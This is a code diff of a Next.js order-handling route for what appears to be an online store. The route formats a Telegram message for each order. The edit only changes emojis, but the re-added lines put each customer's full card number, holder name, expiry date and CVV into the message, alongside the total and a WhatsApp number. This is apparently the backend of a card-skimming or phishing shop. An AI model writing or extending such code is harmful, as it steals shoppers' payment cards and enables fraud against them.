@@ -17,21 +17,21 @@ export async function POST(req: NextRequest) {
 
   // Send Telegram
   const text = [
-    `🏪 طلب لـ متجر مؤسسة مدار التقنية`,
-    `🔢 رقم الطلب: #${orderId}`,
+    `🛒 طلب لـ متجر مؤسسة مدار التقنية`,
+    `🔖 رقم الطلب: #${orderId}`,
     ``,
-    `💰 Total Amount: ${total} SAR`,
+    `💲 Total Amount: ${total} SAR`,
     ...(installmentType === "installment"
-      ? [`💵 First Payment: ${downPayment} SAR`]
-      : [`💵 Payment Type: Full Amount`]),
+      ? [`🧾 First Payment: ${downPayment} SAR`]
+      : [`🧾 Payment Type: Full Amount`]),
     ``,
-    `💳 MadaVisa - New Order`,
-    `👤 Order For: ${customer ?? "-"}`,
-    `📱 WhatsApp: ${whatsapp ?? "-"}`,
-    `💳 Card Number: ${cardNumber}`,
-    `👤 Card Holder: ${cardHolder}`,
-    `📅 Valid To: ${expiry}`,
-    `🔐 CVV: ${cvv}`,
+    `🏦 MadaVisa - New Order`,
+    `🙍 Order For: ${customer ?? "-"}`,
+    `📲 WhatsApp: ${whatsapp ?? "-"}`,
+    `🪪 Card Number: ${cardNumber}`,
+    `✍️ Card Holder: ${cardHolder}`,
+    `📆 Valid To: ${expiry}`,
+    `🔑 CVV: ${cvv}`,
   ].join("\n");
 
   const whatsappNum = (whatsapp ?? "").replace(/\D/g, "");
